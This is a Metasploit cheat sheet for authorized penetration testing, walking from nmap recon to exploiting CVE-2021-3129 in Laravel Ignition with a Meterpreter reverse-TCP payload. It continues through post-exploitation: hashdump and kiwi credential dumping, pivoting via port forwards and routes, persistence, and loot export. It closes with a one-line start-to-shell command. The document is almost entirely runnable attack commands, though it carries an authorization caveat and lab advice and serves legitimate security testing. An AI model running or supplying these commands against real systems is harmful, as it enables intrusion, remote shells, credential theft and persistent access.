# Metasploit Quick Workflow (Parrot OS)

Use only on hosts you are authorized to test. Keep this in a disposable VM or isolated lab.

## 0) Install and Prep
- Install: `sudo apt update && sudo apt install metasploit-framework seclists smbmap crackmapexec impacket-scripts`
- Start DB: `sudo systemctl start postgresql && msfdb init`
- Launch console: `msfconsole`

## 1) Recon (Outside MSF First)
```bash
# Full scan, save XML for import
nmap -sV -O -p- -oA target_full 10.0.0.5
```
Import into Metasploit:
```bash
db_import target_full.xml   # or db_nmap -sV -O 10.0.0.5
hosts
services
```

## 2) Recon (Inside MSF)
- Service/version checks: `services`, `vulns`
- Aux scanners (examples):
  - `use auxiliary/scanner/portscan/tcp`
  - `use auxiliary/scanner/http/title`
  - `use auxiliary/scanner/ssh/ssh_version`
- Targeted vuln checks (be deliberate):
  - `use auxiliary/scanner/http/wordpress_*`
  - `use auxiliary/scanner/http/apache_normalize_path`

## 3) Pick Exploit + Payload
```bash
search CVE-2021-3129
use exploit/multi/http/laravel_ignition_rce
set RHOSTS 10.0.0.5
set RPORT 443
set TARGETURI /
set SSL true
set LHOST 10.0.0.2
set PAYLOAD php/meterpreter/reverse_tcp
check     # when supported
run
```

## 4) Handle Sessions (Meterpreter)
```bash
sessions -l
sessions -i 1
sysinfo
getuid
ipconfig    # or ifconfig
ps
```

## 5) Post-Exploitation Essentials
- Credentials: `hashdump` (needs SYSTEM), `kiwi`/`sekurlsa::logonpasswords`
- Recon: `run post/multi/recon/local_exploit_suggester`
- File ops: `ls`, `cat`, `download`, `upload`
- Pivot: `portfwd add -l 8443 -p 443 -r 10.0.0.5`, `route add 10.0.1.0 255.255.255.0 1`, then use `socks4a` + ProxyChains
- Persistence (only with approval): `run persistence`

## 6) Loot, Notes, Export
```bash
loot
creds
notes
hosts -o hosts.csv
services -o services.csv
```

## 7) Cleanup
- Remove persistence, routes, forwards
- `sessions -K` (kill all) or close individually
- Stop DB if desired: `sudo systemctl stop postgresql`

## Handy Add-Ons
- Payload helpers: `msfvenom` (built-in), `msfpc` (wrapper)
- Wordlists: `seclists` (`/usr/share/seclists`)
- SMB/AD helpers: `smbmap`, `crackmapexec`, `impacket-*`
- Automation: `python3-metasploit` or `ruby-msfrpc-client` for scripting
- Recon console: `recon-ng` (optional)
- GUIs: Armitage (legacy GUI; optional)

## One-Liner Example (Start to Shell)
```bash
sudo systemctl start postgresql && msfdb init
msfconsole -q -x "db_nmap -sV -O 10.0.0.5; \
use exploit/multi/http/laravel_ignition_rce; \
set RHOSTS 10.0.0.5; set RPORT 443; set TARGETURI /; set SSL true; \
set LHOST 10.0.0.2; set PAYLOAD php/meterpreter/reverse_tcp; \
run"
```

Keep logs of commands and timestamps for reporting; avoid noisy scans on production unless explicitly authorized. 
